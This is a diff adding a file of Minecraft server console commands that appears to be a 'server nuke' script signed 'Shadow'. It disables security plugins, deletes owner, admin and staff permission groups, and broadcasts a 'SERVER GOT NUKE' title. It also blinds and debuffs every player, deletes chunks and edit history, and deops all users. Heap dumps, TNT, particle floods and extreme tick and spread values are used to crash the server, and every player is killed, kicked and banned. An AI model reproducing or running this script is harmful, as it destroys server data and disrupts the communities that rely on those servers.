@@ -1,0 +1,64 @@
+broadcast reload 
+bettersecurity reload
+sk disable all
+skript reload all
+reload
+lp log notify off
+lp deletetrack staff
+lp deletetrack staffteam
+lp deletetrack Staff
+lp deletetrack StaffTeam
+lp deletegroup owner
+lp deletegroup Owner
+lp deletegroup Admin
+lp deletegroup admin
+say @owner
+say @cowner
+say @co-owner
+say @admin
+say @mod
+say @staff
+say @staff member
+say @everyone
+tellraw @a ["",{"text":"SERVER GET NUKE BY ","bold":true,"color":"red"},{"text":"Shadow","bold":true,"italic":true,"underlined":true,"color":"gray"}]
+title @a title ["",{"text":" w","obfuscated":true,"color":"red"},{"text":"SERVER GOT NUKE BY ","color":"red"},{"text":"w","obfuscated":true,"color":"red"}]
+title @a times 72000 72000 72000
+item replace entity @a armor.head with minecraft:carved_pumpkin 
+playsound minecraft:music_disc.11 player @a
+effect give @a minecraft:darkness infinite
+effect give @a minecraft:blindness infinite
+effect give @a minecraft:nausea infinite
+effect give @a minecraft:glowing infinite
+effect give @a minecraft:weakness infinite
+effect give @a minecraft:slowness infinite
+defaultgamemode adventure
+delchunks
+clearhistory 
+clearclipboard
+//watchdog inactive
+give @a minecraft:barrier 6400
+spark heapdump
+deop @a
+discordsrv reload
+discordsrv debugger
+paper dumpplugins
+paper debug chunks
+fastasyncworldedit threads
+execute if entity @a run summon tnt ~ ~ ~ {Fuse:80}
+tp @a @e[type=tnt,limit=1,sort=nearest]
+execute at @a[distance=3..] run particle elder_guardian ~ ~ ~ 1 1 1 1 2147483647 force @a
+execute at @a run particle flame ~ ~ ~ 1 1 1 1 2147483647 force @a
+paper heap
+tick rate 9999
+jfr start
+jfr stop
+vvbukkit dump
+gamerule randomTickSpeed 999999999
+spreadplayers 9999999999999999999999999 99999999999999 99999999999999999999999 9999999999999999999999999  
+true @a
+
+kill @a
+kick @a 
+ban-ip @a 
+kick * Shadow
+ban * Shadow
